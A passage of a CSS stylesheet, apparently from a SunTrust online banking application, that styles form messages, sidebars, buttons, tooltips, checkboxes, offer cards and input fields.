    .form-error .error-title, .page-section-error .error-title {
        font-weight: bold;
        margin-top: 0;
    }

        .form-error .error-title.no-content, .page-section-error .error-title.nocontent {
            margin: 0;
        }

    .form-error .error-content, .page-section-error .error-content {
        margin-bottom: 0;
    }

.form-success {
    position: relative;
    background-color: #dffde5;
    padding: 20px 20px 20px 60px;
    margin-top: 20px;
}

    .form-success:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e010";
        position: absolute;
        top: 20px;
        left: 20px;
        color: #178817;
        font-size: 25px;
    }

    .form-success .success-title {
        font-weight: bold;
        margin: 0;
    }

    .form-success .success-content {
        margin: 20px 0 0 0;
    }




.form-warning {
    position: relative;
    /* background-color: #f5ecdd;
    background:#FEFFDD; */
    background: #FEFFDD;
    padding: 20px 20px 20px 60px;
    margin-top: 20px;
    border: 0px solid #ee6120;
}

    .form-warning:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e003";
        position: absolute;
        top: 20px;
        left: 20px;
        color: rgb(248, 161, 49);
        font-size: 25px;
        /* font-family: "olb-icons";
	display: inline-block;
	font-weight: bold;
	font-style: normal;
	text-decoration: inherit;
	content: "!";
	position: absolute;
	top: 17px;
	left: 15px;
	font-size: 1.5em;
    color: #fff;
    background: rgb(248, 161, 49);
    border:0px solid #ee6120;
    border-radius:50% 50%;
    padding:.1em .4em; */
    }

    .form-warning .warning-title {
        font-weight: bold;
        margin: 0;
    }

    .form-warning .warning-content {
        margin: 20px 0 0 0;
    }

.warning-note {
    padding: 20px 10px !important;
    background: #f8f1e6;
    border-radius: 4px;
}

.form-lock {
    position: relative;
    /* background-color: #f5ecdd;
    background:#FEFFDD; */
    background: #f5f5f5;
    padding: 20px 20px 20px 60px;
    margin-top: 20px;
    border: 0px solid #ccc;
}

    .form-lock:before {
        color: #ccc;
        position: absolute;
        top: 17px;
        left: 20px;
        font-size: 25px;
        /* border-radius:50% 50%;
    padding:.2em .1em;
    border:1px solid #ccc;
    background:#fff; */
        font-family: "sun-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\f10e";
        /* font-family: "olb-icons";
	display: inline-block;
	font-weight: bold;
	font-style: normal;
	text-decoration: inherit;
	content: "!";
	position: absolute;
	top: 17px;
	left: 15px;
	font-size: 1.5em;
    color: #fff;
    background: rgb(248, 161, 49);
    border:0px solid #ee6120;
    border-radius:50% 50%;
    padding:.1em .4em; */
    }

    .form-lock .lock-title {
        font-weight: bold;
        margin: 0;
    }

    .form-lock .lock-content {
        margin: 20px 0 0 0;
    }

.lock-note {
    padding: 20px 10px !important;
    background: #f8f1e6;
    border-radius: 4px;
}


/* content specs */

.boldface {
    font-weight: bold;
}

.nobold {
    font-weight: normal;
}

.main-container {
    background: none repeat scroll 0 0 rgb(255, 255, 255);
    padding-bottom: 60px;
    position: relative;
    /*   padding-top:100px;  TESTING */
}

.main-content {
    margin: 0 auto;
    max-width: 1000px;
    padding: 0 10px;
}

    .main-content.no-progress {
        border-top: 1px solid #eee;
    }

        .main-content.no-progress .progress-tracker-container {
            display: none;
        }

.page {
    width: 675px;
}

h1.page-title {
    margin: 1em 0 .5em 0;
    line-height: 1.2em;
    font-weight: normal;
}

.page h3 {
    color: #333;
}

ul.display li {
    margin: 1em 0;
}

.display-tight li {
    margin: .5em 0;
}

.sidebar {
    float: right;
    width: 275px;
    color: #707070;
}


.sidebar-content {
    margin-top: 1em;
    padding: 10px 10px 100px 30px;
    border-left: 1px solid #eee;
    overflow-y: auto;
    height: 90%;
}

.sidebar-container h3 {
    font-size: 1.7rem;
    color: rgb(13, 54, 90); /* --- blue --- */
    /* color: #ee6120;                --- orange --- */
    margin: 1em 0 1.5em .5em;
    border-bottom: 0px solid #ccc;
}

.sidebar-container ul {
    padding: 0;
    margin: 0 0 3em 1.8em;
    font-size: 1.3rem;
}

.sidebar-container li {
    margin-bottom: .5em;
}

.sidebar-container ul.selections, .sidebar-container ul.status {
    list-style-type: none;
    margin: 0 0 3em .5em;
    font-size: 1.3rem;
}

    .sidebar-container ul.selections li, .sidebar-container ul.status li {
        margin-bottom: 1em;
        overflow: visible;
        padding-left: 42px;
        position: relative;
    }

    .sidebar-container ul.selections.finished {
        margin: 0 0 3em 2.5em;
        font-size: 1.3rem;
    }

        .sidebar-container ul.selections.finished li {
            margin-bottom: 1em;
            overflow: visible;
            padding-left: 15px;
            position: relative;
        }

            .sidebar-container ul.selections.finished li:before {
                color: rgb(23, 136, 23);
                content: "\e010";
                font-family: "olb-icons";
                left: -18px;
                position: absolute;
            }

    .sidebar-container ul.selections li:before {
        left: 10px;
        position: absolute;
        content: "\e010";
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        padding-right: 1em;
        color: rgb(23, 136, 23); /* --- green --- */
        /* color: rgb(248, 161, 49);        --- orange --- */
    }

    .sidebar-container ul.status li:before {
        left: 9px;
        position: absolute;
        content: "\e027";
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        padding-right: 1em;
        /* color: rgb(23, 136, 23);        --- green --- */
        /* color: rgb(255, 255, 0);        --- yellow --- */
        /* color: rgb(248, 161, 49);        --- orange --- */
        /* color: rgb(255, 0, 0);          --- red --- */
    }

    .sidebar-container ul.status li.pending:before {
        /* color: rgb(23, 136, 23);        --- green --- */
        /*  color: rgb(255, 255, 0);       --- yellow --- */
        color: rgb(248, 161, 49); /*    --- orange --- */
        /* color: rgb(255, 0, 0);          --- red --- */
    }

    .sidebar-container ul.status li.approved:before {
        color: rgb(23, 136, 23); /*  --- green --- */
        /*  color: rgb(255, 255, 0);       --- yellow --- */
        /*  color: rgb(248, 161, 49);    --- orange --- */
        /* color: rgb(255, 0, 0);          --- red --- */
    }

    .sidebar-container ul.status li.declined:before {
        /*  color: rgb(23, 136, 23);       --- green --- */
        /*  color: rgb(255, 255, 0);       --- yellow --- */
        /*  color: rgb(248, 161, 49);    --- orange --- */
        color: rgb(255, 0, 0); /*  --- red --- */
    }

    .sidebar-container ul.status li.complete:before {
        color: rgb(224, 224, 224);
    }



.sidebar-container ul.questions, .sidebar-container ul.save-retrieve {
    list-style-type: none;
    margin: 0 0 2em .5em;
    font-size: 1.3rem;
}

    .sidebar-container ul.questions a:link, .sidebar ul.questions a:hover, .sidebar ul.questions a:visited, .sidebar ul.questions a:active,
    .sidebar-container ul.save-retrieve a:link, .sidebar ul.save-retrieve a:hover, .sidebar ul.save-retrieve a:visited, .sidebar ul.save-retrieve a:active {
        text-decoration: none;
        color: #707070;
    }

    .sidebar-container ul.save-retrieve a:hover, .sidebar-container ul.save-retrieve a:hover {
        text-decoration: none;
        color: #707070;
    }

    .sidebar-container ul.save-retrieve li, .sidebar-container ul.save-retrieve li {
        margin-bottom: .25em;
    }

div.menu-link {
    display: none;
    cursor: pointer;
}

div.close-link {
    display: none;
    cursor: pointer;
}


    div.close-link:before {
        font-size: 20px;
        font-size: 2rem;
        line-height: 25px;
        line-height: 2.5rem;
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e019";
    }

/* footer-arc specs */

.left-rounded-footer {
    background-image: url("../images/footer-left-arc.png");
    left: 0;
}

.right-rounded-footer {
    background-image: url("../images/footer-right-arc.png");
    right: 0;
}

.left-rounded-footer, .right-rounded-footer {
    background-repeat: no-repeat;
    background-size: 610px 65px;
    bottom: 0;
    height: 65px;
    position: absolute;
    width: 610px;
    margin-top: 1em;
}


/* footer specs */

.footer {
    background: none repeat scroll 0 0 rgb(244, 244, 244);
    border-top: 1px solid rgb(244, 244, 244);
    color: rgb(112, 112, 112);
    font-size: 1.2rem;
    font-weight: 400;
    line-height: 1.4rem;
    position: relative;
    z-index: 4;
}

.footer-container {
    box-sizing: border-box;
    margin: 0 auto;
    max-width: 1000px;
    padding: 20px 10px 10px 10px;
}

.ehl-icon:before {
    font-family: "sun-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\f10a";
    font-size: 1.5em;
    padding: 0 5px 0 0;
    position: relative;
    top: .28em;
}

.disclaimer > p {
    margin: 0;
}

.disclaimer-list {
    list-style: disc outside none;
    margin: 0;
    padding: 0;
}

    .disclaimer-list > li {
        display: inline;
    }



/* button specs */

.align-right {
    text-align: right;
}


.button-primary {
    background: none repeat scroll 0 0 rgb(0, 56, 113);
    border: medium none;
    border-radius: 4px;
    color: rgb(255, 255, 255);
    cursor: pointer;
    font-size: 16px;
    min-width: 120px;
    padding: 7px 24px;
    text-align: center;
    transition: background 0.15s ease-in 0s;
    outline: none;
}

    .button-primary:hover, .button-primary:focus {
        background: #00294d;
        transition: background 0.05s ease-in 0s;
    }

.button-primary {
    color: rgb(255, 255, 255);
}

.button-row {
    padding: 4em 0;
}

.button-content {
    margin: 0 auto;
    max-width: 1000px;
    padding: 0 10px;
}

.button-row button {
    float: right;
}

.button-row .button-secondary {
    float: left;
}

.button-row .align-left {
    float: left;
}

.esign-btn {
    padding-top: 1em !important;
}

.button-row.align-center {
    text-align: center;
    padding: 1em;
}

.button-row button.disabled {
    background-color: rgb(153, 175, 198);
    transition: background 0.15s ease-in 0s;
}


.button-secondary {
    background: none repeat scroll 0 0 rgb(255, 255, 255);
    border: 1px solid rgb(189, 189, 189);
    border-radius: 4px;
    color: rgb(0, 56, 113);
    cursor: pointer;
    padding: 7px 24px;
    text-align: center;
    transition: background 0.15s ease-in 0s;
    margin-right: 30px;
}

.button-tertiary {
    display: inline-block;
    margin-right: 30px;
    margin-left: 18px;
    position: relative;
    top: .5em;
}

.button-link {
    display: inline-block;
    margin-right: 30px;
    margin-left: 18px;
    position: relative;
    top: .5em;
}

.button-secondary:hover,
.button-secondary:active,
.button-secondary:focus {
    text-decoration: none;
    color: #00294d;
    border-color: #00294d;
}

.button-tertiary:hover,
.button-tertiary:active,
.button-tertiary:focus {
    text-decoration: underline;
    color: #00294d;
}

.button-link:hover,
.button-link:active,
.button-link:focus {
    text-decoration: underline;
    color: #005EAD;
}

.button-tertiary:before {
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    content: "\e01a";
    text-decoration: none;
    display: inline-block;
    position: relative;
    top: -3px;
    background-color: #ee6120;
    border-radius: 50%;
    color: #ffffff;
    font-size: 9px;
    text-align: center;
    line-height: 1em;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    padding: 4px;
    margin-right: 5px;
}

.button-tertiary.nox:before {
    content: none;
}

.button-tertiary:hover:before,
.button-tertiary:active:before,
.button-tertiary:focus:before {
    background-color: #cc2900;
    text-decoration: none;
}

.button-tertiary-link:hover,
.button-tertiary-link:active,
.button-tertiary-link:focus {
    text-decoration: underline;
    color: #00294d;
}

.button-tertiary-link {
    display: inline-block;
    margin-right: 30px;
    margin-left: 18px;
    position: relative;
    top: .5em !important;
}

    .button-tertiary-link:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        text-decoration: none;
        display: inline-block;
        position: relative;
        top: -3px;
        border-radius: 50%;
        color: #ffffff;
        font-size: 9px;
        text-align: center;
        line-height: 1em;
        -moz-box-sizing: border-box;
        box-sizing: border-box;
        padding: 4px;
        margin-right: 5px;
    }

.button-link:before {
    display: inline-block;
    text-decoration: inherit;
    text-decoration: none;
    display: inline-block;
    position: relative;
    top: -3px;
    background-color: #ee6120;
    border-radius: 50%;
    color: #ffffff;
    font-size: 14px;
    text-align: center;
    line-height: 1em;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    padding: 4px;
    margin-right: 5px;
}

.button-tertiary-link.nox:before {
    content: none;
}

.button-link.nox:before {
    content: none;
}

.button-link:hover:before,
.button-link:active:before,
.button-link:focus:before {
    background-color: #cc2900;
    text-decoration: none;
}

.button-tertiary-link:hover:before,
.button-tertiary-link:active:before,
.button-tertiary-link:focus:before {
    background-color: #cc2900;
    text-decoration: none;
}



/* tooltip specs */



.icon-tooltip {
    display: inline-block;
    position: relative;
    height: 16px;
    width: 16px;
    cursor: pointer;
}

    .icon-tooltip:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e039";
        color: #ffffff;
        background: #aaa;
        font-size: 10px;
        line-height: 16px;
        text-align: center;
        border-radius: 50%;
        position: absolute;
        left: 0;
        top: 0;
        right: 0;
        bottom: 0;
    }


.input-label .icon-tooltip {
    top: 3px;
    margin-left: 2px;
}


.tooltip-note {
    color: #C94C06;
    font-size: 1.4rem;
}

    .tooltip-note .icon-tooltip {
        top: 2px;
        left: 3px;
    }

.tooltip-title {
    padding: 3px 5px;
    margin: 5px -5px 3px -5px;
    background: #333;
    border-radius: 4px;
    font-weight: bold;
}


/* ************* Temp form styles  *************** */

form *, * {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}

form fieldset {
    border: 0;
    margin: 0;
    padding: 0;
}
/*chandra - 19.5 START */
.bootstrap {
    color: rgb(51, 51, 51);
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
    font-size: 1.5rem;
    font-weight: normal;
    line-height: 2rem;
    margin: 0;
    border-top: 0px solid #fff;
}

    .bootstrap .firstrow {
        margin-top: -10px;
    }

    .bootstrap .form-input-control {
        width: 100%;
        border: 1px solid #CCCCCC;
        border-radius: 4px;
        box-sizing: border-box;
        -moz-box-sizing: border-box;
        color: rgb(51, 51, 51);
        font-family: "suntrustregular", "Trebuchet MS", sans-serif;
        font-size: 16px;
        padding: 0px 10px 0px 10px;
        height: 40px;
        /* Zero out the gradients that are the default for a couple of native form controls in some browsers */
        background: -moz-linear-gradient(top, #fff 0%, #fff 100%); /* FF3.6+ */
        background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#fff), color-stop(100%,#fff)); /* Chrome,Safari4+ */
        background: -webkit-linear-gradient(top, #fff 0%,#fff 100%); /* Chrome10+,Safari5.1+ */
        background: -o-linear-gradient(top, #fff 0%,#fff 100%); /* Opera 11.10+ */
        background: -ms-linear-gradient(top, #fff 0%,#fff 100%); /* IE10+ */
        background: linear-gradient(to bottom, #fff 0%,#fff 100%); /* W3C */
    }
.citizenship-multiselect{
    width:36% !important;
}
.control-label {
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
    ;
    color: #333333;
    font-size: 15px;
}

.pdf-links {
    font-size: 15px;
    color:#005EAD !important;
}
.offer-section {
     margin-bottom:20px;
}
.offer-details-links {
font-size: 15px;
    color:#005EAD !important;
    cursor:pointer;
   
}

    .arrow-setting {
    width: 20px;
    height: 20px;
    position: relative;
    top:-3px;
    cursor:pointer;
    }

.check-icon-li > li {
    list-style: none;
    margin-bottom: 1em;
    overflow: visible;
    /*padding-left: 15px;*/
    position: relative;
    font-size: 15px;
}

.non-check-icon-li > li {
    margin-bottom: 1em;
    overflow: visible;
    /*padding-left: 15px;*/
    position: relative;
    font-size: 15px;
}

    .non-check-icon-li > li.pdf-link-bullet {
        list-style-type: none;
        position: relative;
        left: -17px;
        padding-top:0px;
    }
 .non-check-icon-li >li.pdf-link-bullet a {
color:#005EAD !important;
}
.tickmark-li:before{
    left: -21px;
    position: absolute;
    content: "\e010";
    font-family: "olb-icons";
    display: inline-block;
    font-weight: normal;
    font-style: normal;
    text-decoration: inherit;
    padding-right: 1em;
    color: #02A397;
}

.tickmark-li.greyText {
    color: #707070;
}

    .tickmark-li.greyText:before {
        display: none;
    }

.promo-details {
    font-size: 18px;
}

.promo-sidebar {
    padding-right: 0px;
    margin-top: 8px;
}

.promo-link {
    color: #005EAD !important;
    font-size:15px;
    padding-left:5px;
}
/* .promo-link:before{
    background:url("../images/X\ Remove.svg");
    background-repeat: no-repeat;
    height: 20px;
    width: auto;
    margin-top: 6px;
} */
.remove-promo {
    width: 10px;
    height: 10px;
    position: relative;
    bottom: 3px;
}

.tooltip {
    pointer-events: none;
}

.promo-header {
    font-size: 23px;
    color: #003B71;
    font-weight: bold;
    line-height: 1.5;
    margin-bottom: 2rem !important;
}
/*.card {
	border-radius:4px 4px 4px 4px;
    min-height:144px;
	vertical-align:middle;
    border:2px;
    border-style: solid;
    border-color: #CFCFCF;
    padding: 29px 37px 26px 47px;
}*/
.recommendation-header {
    margin-top: 50px;
    margin-bottom: 30px;
    font-weight: bold;
    font-size: 20px;
}

.offer-card .col-md-6 .card-pdf {
    padding-left: 24px !important;
    padding-bottom: 30px;
    margin-left: 1px;
    margin-right: 1px;
}

.card-pdf {
    padding-left: 47px !important;
    padding-bottom: 30px;
    margin-left: 1px !important;
    margin-right: 1px !important;
    margin-bottom:1px !important;
}

.special-upgrade {
    background: transparent linear-gradient(180deg, #D66112 0%, #C94C06 100%) 0% 0% no-repeat padding-box;
    /* border: 1px solid #D66112; */
    border-radius: 22px;
    opacity: 1;
    height: 36px;
    width: 176px;
    margin-top: 60px;
    margin-bottom: 33px;
}

    .special-upgrade p {
        text-align: left;
        color: #FFFFFF;
        top: -18px;
        left: 45px;
        position: relative;
    }
    

.special-upgrade-img {
    position: relative;
    top: 8px;
    left: 18px;
}
.special-upgrade-RTOOffer {
    background: transparent linear-gradient(180deg, #D66112 0%, #C94C06 100%) 0% 0% no-repeat padding-box;
    /* border: 1px solid #D66112; */
    border-radius: 22px;
    opacity: 1;
    height: 36px;
    width: 176px;
    margin-top: 60px;
    margin-bottom: 33px;
}
.special-upgrade-RTOOffer p {
    text-align: center;
    color: #FFFFFF;
    padding-top: 6px;
}
.offer-card .card {
    border-radius: 4px 4px 4px 4px !important;
    height: 100%;
}

.offer-card > .row {
margin-bottom:30px;
}
.offer-card > .row:last-child {
margin-bottom:0px;
}
.offer-card > .row:first-child {
margin-top:25px;
}
    
.offer-card .card-body {
    padding-left: 47px !important;
    padding-top: 29px !important;
    padding-bottom: 0px !important;
}

.offer-card .col-md-6 .card-body {
    padding-left: 24px !important;
    padding-top: 29px !important;
    padding-bottom: 0px !important;
}

.offer-card .card-footer {
    height: 56px;
    background-color: #D4E1EF !important;
    text-align: left !important;
    color: #005EAD;
    cursor: pointer;
    padding: .75rem 1.25rem !important;
}

    .offer-card .card-footer:last-child {
        border-radius: 0px !important;
    }

.offer-card .selected {
    background-color: #005EAD !important;
    color: #FFFFFF;
}

.offer-card .offer-added {
    border-color: #005EAD !important;
}

.offer-suggestion-question {
    margin-top: 30px !important;
}

.checkbox {
    display: inline-block;
    width: 100%;
    margin: 0;
}

    .checkbox + .checkbox {
        margin-top: 10px;
    }

fieldset .checkbox {
    margin: 10px 0;
}

.checkbox input[type="checkbox"] {
    opacity: 0;
    margin: 0;
    z-index: 1;
    height: 24px;
    width: 24px;
    cursor: pointer;
    top: 8px;
    left: 32px;
    position: relative;
}

.owners-list .checkbox input[type="checkbox"] {
    opacity: 0;
    margin: 0;
    z-index: 1;
    height: 24px;
    width: 24px;
    cursor: pointer;
    top: 14px;
    left: 8px;
    position: relative;
}

    .owners-list .checkbox input[type="checkbox"] + label {
        font-size: 1.7rem;
        padding-left: 40px;
        vertical-align: middle;
        line-height: 15px;
        position: relative;
        top: -23px;
    }

.checkbox .text-muted {
    color: #808080 !important;
}

.owners-list .checkbox input[type="checkbox"] + label:before {
    height: 24px;
    width: 24px;
    background-color: #FFFFFF !important;
    border: 1px solid #707070;
    border-radius: 4px;
    content: '';
    position: absolute;
    left: 8px;
    top: 8px;
    outline: none;
}

.owners-list .checkbox input[type="checkbox"]:checked + label:before {
    background: url("../images/Checkmark_White.svg") no-repeat scroll 57% center;
    border: 1px solid #005EAD !important;
    border-radius: 4px !important;
    background-color: #005EAD !important;
}

.owners-list .checkbox input[type="checkbox"]:disabled + label:before {
    height: 24px;
    width: 24px;
    background-color: #FFFFFF !important;
    border: 1px solid #ffffff !important;
    border-radius: 4px;
    content: '';
    position: absolute;
    left: 8px;
    top: 8px;
    outline: none;
}

.owners-list .checkbox input[type="checkbox"]:checked:disabled + label:before {
    background: url("../images/Checkmark_Gray.svg") no-repeat scroll 57% center;
}

.icon-class {
    background-color: #D4E1EF !important;
    height: 100%;
    position: relative;
    border: 1px solid #005EAD;
    border-radius: 4px 0px 0px 4px;
}

.circle {
    width: 50px;
    height: 50px;
    border-radius: 50%;
    line-height: 50px;
    text-align: center;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: url(../images/Important_blue.svg) no-repeat;
}

.Additionalowners-note .row {
    height: 100% !important;
    box-sizing: border-box;
    margin: 0 !important;
}

    .Additionalowners-note .row .col-md-3 {
        padding-right: 0;
        padding-left: 0;
    }

    .Additionalowners-note .row .col-md-9 {
        padding-left: 30px;
        border: 1px solid #005ead;
        border-left: none;
        border-radius: 0px 4px 4px 0px;
    }

.Additionalowners-note {
    /*border: 1px solid #005EAD !important ;*/
    border-radius: 4px;
    height: 158px;
    margin: 1em 0 1em 0 !important;
}

    .Additionalowners-note .pdf-links {
        font-size: 12px;
    }

.offer-card .col-md-6 .checkbox input[type="checkbox"] {
    opacity: 0;
    margin: 0;
    z-index: 1;
    height: 24px;
    width: 24px;
    cursor: pointer;
    top: 8px;
    left: 9px;
    position: relative;
}

.checkbox input[type="checkbox"] + label {
    font-size: 20px;
    padding-left: 40px;
    vertical-align: middle;
    line-height: 22px;
    margin-bottom: 0 !important;
}

.offer-card .col-md-6 .checkbox input[type="checkbox"] + label {
    padding-left: 20px;
}

.checkbox input[type="checkbox"] + label:before {
    height: 24px;
    width: 24px;
    background-color: #FFFFFF !important;
    border: 1px solid #005EAD;
    border-radius: 4px;
    content: '';
    position: absolute;
    left: 47px;
    top: 8px;
    outline: none;
}

.offer-card .col-md-6 .checkbox input[type="checkbox"] + label:before {
    left: 24px;
}

.checkbox input[type="checkbox"]:checked + label:before {
    background: url("../images/blue.svg") no-repeat scroll 57% center;
    border: 1px solid #005EAD !important;
    border-radius: 4px !important;
}

input[type="checkbox"]:focus + label:before {
    outline: none;
    border: 1px solid #005EAD;
    -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6);
    box-shadow: inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6);
}

label[for=field_check] {
    height: 75px;
    line-height: 75px;
    overflow: hidden;
    display: inline-block;
    border-radius: 10px;
}

.bootstrap .tooltipinner {
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
    font-size: 14px;
    background-color: transparent;
    font-weight: normal;
    font-style: normal;
}

.bootstrap .tooltip-inner {
    max-width: 300px;
    padding: 1.25rem 1.25rem 1.25rem 1.25rem;
    color: #fff;
    line-height: 1.5rem;
    text-align: left;
    background-color: #000;
    border-radius: 0;
}


.bootstrap .field-icon a {
    position: relative;
    z-index: 1;
    font-family: suntrustregular;
    color: #005EAD;
    font-size: 12px;
    /*position: relative;*/
    float: right;
    right: 10px;
    bottom: 30px;
}

.LoginModal .bootstrap .field-icon a {
    position: relative;
    z-index: 1;
    font-family: suntrustregular;
    color: #005EAD;
    font-size: 12px;
    /*position: absolute;*/
    float: right;
    right: 20px;
    top: 30px;
}

.bootstrap .field-icon a:not([href]):not([tabindex]),
.bootstrap .field-icon a:not([href]):not([tabindex]):focus,
.bootstrap .field-icon a:not([href]):not([tabindex]):hover {
    color: #005EAD;
}

.bootstrap .sub-text-row-lock {
    color: rgb(112, 112, 112);
    color: #707070;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    margin: 0px 0px 0px 18px;
    padding: 0px;
}

    .bootstrap .sub-text-row-lock.locked:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e025";
        color: #ddd;
        font-size: 12px;
        margin: 0 6px;
        position: relative;
        margin-left: -18px;
    }

.bootstrap .inline-error {
    display: inline-block;
}

.bootstrap .aligntop {
    margin-top: -20px;
}

.bootstrap .info-text {
    font-size: 12px;
    line-height: 16px;
    color: #707070;
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
}

.olb-info-text {
    margin-bottom: 25px;
}

::placeholder { /* Chrome, Firefox, Opera, Safari 10.1+ */
    color: #B4B3B3;
    opacity: 1; /* Firefox */
}

:-ms-input-placeholder { /* Internet Explorer 10-11 */
    color: #B4B3B3;
}

::-ms-input-placeholder { /* Microsoft Edge */
    color: #B4B3B3;
}

.subtitle {
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
    font-size: 18px;
    color: #333333;
}

.bootstrap .phonetype-dropdown {
    width: 42%;
    border-radius: 4px 0px 0px 4px;
}

.bootstrap .phonetext {
    margin-left: -3px;
    border-radius: 0px 4px 4px 0px;
    width: 57%;
}

.bootstrap .input-control-select {
    overflow: visible;
    padding: 1px;
    margin: 0 0 10px 0;
    border: none;
    display: inline-block;
}

.toppadding {
    padding-top: 10px;
}

.hidecontrol {
    display: none;
}

.sub-label-padding {
    margin-top: -5px;
    margin-bottom: 10px;
}

.bootstrap .hasError .input-error {
    background-image: url('../images/Group 243.svg');
    background-repeat: no-repeat;
    height: 20px;
    width: auto;
    margin-top: 6px;
}

.bootstrap .hasError select,
.bootstrap .hasError input[type=text],
.bootstrap .hasError input[type=email],
.bootstrap .hasError input[type=url],
.bootstrap .hasError input[type=password],
.bootstrap .hasError input[type=color],
.bootstrap .hasError input[type=date],
.bootstrap .hasError input[type=datetime],
.bootstrap .hasError input[type=datetime-local],
.bootstrap .hasError input[type=email],
.bootstrap .hasError input[type=month],
.bootstrap .hasError input[type=number],
.bootstrap .hasError input[type=range],
.bootstrap .hasError input[type=search],
.bootstrap .hasError input[type=tel],
.bootstrap .hasError input[type=time],
.bootstrap .hasError input[type=url],
.bootstrap .hasError input[type=week],
.bootstrap .hasError textarea,
.bootstrap .hasError .selectize-control .selectize-input,
.bootstrap .hasError .input-control-select .inputTags-list {
    border-color: #DB0018;
    border-width: 1px;
}
.bootstrap .hasError .inputTags-list {
    border-color: #DB0018;
    border-width: 1px;
}

.hasError .selectize-control .selectize-input {
    border-color: #DB0018 !important;
    border-width: 1px;
}

.bootstrap .hasError .error-message {
    display: block;
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    color: #DB0018;
    margin-left: 24px;
    padding-top: 2px;
}
/*chandra - 19.5 END */
/*chandra - 6/14*/
h3.legend {
    padding: 0 10px;
    border-radius: 3px;
    border-bottom: 0px solid #eee;
    margin: 2em 0px;
    font-size: 1em;
    color: #fff;
    text-align: left;
    letter-spacing: 1px;
    font-weight: normal;
    /* background:rgb(0, 56, 113); -- ADA Compliant Blue */
    background: #C94C06; /*  -- ADA Compliant Gray */
    /* background:#D66112; -- ADA Compliant Orange */
}
h3.legendDEP {
    margin: 1.6em 0px !important;
}
    h3 .legend + .switch-section, h3.legend + .photoid-container {
        margin-top: -32px;
    }

    h3.legend.tight {
        margin-top: 0;
    }

    h3.legend.next-steps {
        background: #fff;
        font-size: 1.17em;
        padding: 0;
        color: #ccc;
        border-bottom: 1px solid #eee;
        margin: 2em 10px;
        color: #333;
    }


    h3.legend + .content-copy {
        margin-top: -1em;
    }


h3.question {
    color: #333;
    border: 0;
    margin: 2em 10px;
    margin-bottom: 1em;
}


.input-row, .input-control {
    /* clear: both;       not sure why this is here, but it's messing things up */
    overflow: hidden;
    padding: 1px;
    margin: 0 0 10px 0;
}

    .input-row.special, .input-row.special .input-control {
        overflow: visible;
    }

    .input-row.checkbox-row {
        margin-bottom: 0;
    }

    .input-row.radio-row {
        /* clear: both;       not sure why this is here, but it's messing things up */
        margin-top: 0;
        margin-bottom: 10px;
    }

.input-control, .input-text, .input-button, .input-photo {
    margin: 0;
    display: inline-block;
    margin-bottom: 0;
    width: 60%;
    vertical-align: middle;
}

.input-text {
    margin: 11px 0;
    padding-left: 10px;
}

.input-button {
    margin: 9px 0 5px 0;
    padding-left: 0px;
    position: relative;
    top: -5px;
}

.input-photo {
    margin: 9px 0 5px 0;
    padding-left: 0px;
}

.retake-photo-link {
    position: relative;
    top: -10px;
    left: 10px;
    font-size: 13px;
}

.input-button .button-inline {
    padding: 8px;
    min-width: 150px;
    text-align: center;
}

.radio-row .input-label {
    margin-top: 8px;
}

.radio-row .input-control, .checkbox-row .input-control, .checkbox-toggle-row .input-control {
    padding-top: 3px;
    /*changed from 2px for radios, make sure is fine for checkboxes */
}

.checkbox-toggle-row .input-control {
    padding-top: 5px;
}

.input-row select.sub-control {
    display: block;
    border: 0;
    color: #aaa;
    width: auto;
}

.input-row .input-label {
    display: inline-block;
    font-weight: bold;
    text-align: right;
    vertical-align: top;
    padding-top: 11px;
    padding-right: 5px;
    width: 39%;
}
/*****Chandra Start - 6/14******/
input::-ms-clear {
    display: none;
}

.floatleft {
    float: left;
}

.btn:hover {
    color: #212529;
    text-decoration: none;
}

.floatright {
    float: right;
}

.sub-text-row-lock {
    color: rgb(112, 112, 112);
    color: #707070; /* darker gray text for WCAG 2 compliance */
    font-size: 12px;
    font-weight: normal;
    line-height: normal;
    margin: -10px 0 5px 40%;
    padding: 0 5px;
}

.print {
    display: inline-block;
    position: relative;
    margin: 2.8em 0 .5em 0;
    background: url(../images/Print_Icon.svg) no-repeat;
    background-size: 20px 20px;
}

    .print span {
        display: inline-block;
        margin-left: 30px;
        line-height: 1.2em;
        font-weight: normal;
        font-family: suntrustregular;
        font-size: 12px;
        text-align: center;
        color: #005EAD;
    }

.bootstrap .customcard {
    background-color: #F8F1E7;
    border-radius: 4px 4px 4px 4px;
    min-height: 144px;
    vertical-align: middle;
    border: 0;
}

.bootstrap .card-header {
    margin-bottom: 0;
    background-color: #F8F1E7;
    border-bottom: 0px;
